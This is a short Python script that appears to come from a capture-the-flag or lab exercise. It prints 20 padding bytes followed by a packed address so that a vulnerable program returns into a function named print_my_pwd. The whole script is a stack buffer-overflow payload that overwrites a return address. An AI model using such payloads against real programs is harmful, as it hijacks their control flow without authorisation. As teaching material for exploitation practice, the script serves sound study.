#!/usr/bin/python

import sys
import struct

# distance to rip is 20 bytes
string = "a"*20
sys.stdout.write(string)

# call the print_my_pwd function
pointer = 0x80484b3
sys.stdout.write(struct.pack("@P", pointer))
